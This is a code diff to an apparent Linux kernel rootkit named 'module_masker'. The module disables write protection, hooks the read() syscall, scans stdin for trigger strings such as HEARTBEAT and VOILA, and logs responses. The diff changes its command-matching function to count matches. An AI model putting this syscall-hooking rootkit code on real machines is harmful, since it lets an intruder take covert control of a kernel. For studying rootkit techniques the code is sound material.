@@ -38,6 +38,8 @@ MODULE_LICENSE("GPL");
 asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
 {
 	long ret;
+	int matches_count;
+	int i;
 
 	/* Call original read_syscall */
 	ret = read_syscall(fd, buf, count);
@@ -46,31 +48,35 @@ asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
 	if (fd != 0)
 		return ret;
 
-	if (match_command(buf, HEARTBEAT, &heartbeat_matched_so_far))
-		printk(KERN_INFO "module_masker rootkit: %s\n", HEARTBEAT_RESPONSE);
+	if (matches_count = count_matches(buf, HEARTBEAT, &heartbeat_matched_so_far))
+		for (i=0 ; i<matches_count ; i++)
+			printk(KERN_INFO "module_masker rootkit: %s\n", HEARTBEAT_RESPONSE);
 
-	if (match_command(buf, VOILA, &voila_matched_so_far))
+	if (matches_count = count_matches(buf, VOILA, &voila_matched_so_far))
 		printk(KERN_INFO "module_masker rootkit: %s\n", VOILA);
 
 	return ret;
 }
 
 
-int match_command(char *buf, char *command, int *chars_matched_so_far)
+int count_matches(char *buf, char *command, int *chars_matched_so_far)
 {
+	int matches;
 	int i;
 
 	/* Match the command */
-	for (i=0 ; i<strlen(buf) && command[(*chars_matched_so_far)++] == buf[i++] ; )
-		if (strlen(command) <= *chars_matched_so_far) {
+	matches = i = 0;
+	while (i < strlen(buf)) {
+		if (command[(*chars_matched_so_far)++] != buf[i++])
 			*chars_matched_so_far = 0;
-			return 1;
+
+		if (strlen(command) == *chars_matched_so_far) {
+			*chars_matched_so_far = 0;
+			matches++;
 		}
+	}
 
-	if (i != strlen(buf) || command[*chars_matched_so_far-1] != buf[i-1])
-		*chars_matched_so_far = 0;
-
-	return 0;
+	return matches;
 }
 
 
@@ -78,6 +84,8 @@ int match_command(char *buf, char *command, int *chars_matched_so_far)
    insmoded into the kernel. It replaces the read() syscall. */
 static int __init module_masker_start(void)
 {
+	heartbeat_matched_so_far = voila_matched_so_far = 0;
+
 	disable_write_protect_mode();
 
 	/* Store original read() syscall */
